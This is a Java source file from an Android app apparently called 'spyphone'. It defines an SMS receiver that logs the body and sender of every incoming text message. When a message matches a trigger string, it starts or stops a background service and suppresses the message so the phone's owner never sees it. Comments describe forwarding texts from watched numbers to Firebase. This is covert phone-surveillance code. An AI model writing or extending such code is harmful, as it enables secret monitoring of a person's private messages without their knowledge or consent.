package emit.esy.es.spyphone.broadcastReceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import emit.esy.es.spyphone.R;
import emit.esy.es.spyphone.services.BrokerService;

/**
 * Created by Emil Makovac on 13/05/2015.
 */
public class SmsReceiver extends BroadcastReceiver {

    public static final String LOG_TAG = "SmsReceiver";
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(LOG_TAG, "onReceive");

        Bundle pudsBundle = intent.getExtras();
        Object[] pdus = (Object[]) pudsBundle.get("pdus");
        SmsMessage messages =SmsMessage.createFromPdu((byte[]) pdus[0]);
        Log.i(LOG_TAG,  messages.getMessageBody());
        Log.i(LOG_TAG,  messages.getDisplayOriginatingAddress());
        // if number is in spylist read the sms and send it to firebase, do not abortbroadcast
        // if messagebody is equals to "spyphone - startservice" start thr broker service and abortbroadcast
        // or "spyphone - stopservice" then stop the service
        if(messages.getMessageBody().toLowerCase().trim().equals(context.getResources().getString(R.string.startApp))) {
            Log.d(LOG_TAG, "startApp");
            context.startService(new Intent(context, BrokerService.class));
            abortBroadcast();
        }
        if(messages.getMessageBody().toLowerCase().trim().equals(context.getResources().getString(R.string.stopApp))) {
            Log.d(LOG_TAG, "stopApp");
            context.stopService(new Intent(context, BrokerService.class));
            abortBroadcast();
        }

    }
}
